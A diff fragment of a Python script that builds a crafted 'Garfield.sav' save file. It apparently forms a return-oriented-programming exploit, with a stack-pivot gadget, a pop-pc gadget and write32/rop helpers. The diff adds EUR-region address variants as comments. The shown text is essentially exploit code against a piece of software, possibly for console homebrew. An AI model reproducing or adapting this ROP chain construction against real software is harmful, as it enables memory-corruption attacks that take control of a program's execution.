@@ -1,8 +1,8 @@
 import os,sys,struct
 
 filename="Garfield.sav"
-STR_ADDR=0x1559c350
-SETUP=0x0043f884
+STR_ADDR=0x1559c350 #EUR 0x1559c2d0
+SETUP=0x0043f884    #EUR 0x0043f882
 STACK_PIVOT=0x00165bac #: mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
 GARBAGE=0x44444444
 POPPC=0x00114aec
@@ -57,7 +57,7 @@ def rop(gadget_addr):
 		f.write(struct.pack("<I", gadget_addr))
 	ROP_ADDR+=4
 write32(SETUP, 0xf8)
-write32(STR_ADDR, 0xb4)
+write32(STR_ADDR, 0xb4) #EUR write32(STR_ADDR, 0xac)
 write32(POPPC, 0x26e+4)
 write32(TERM, 0x26e+8)
 
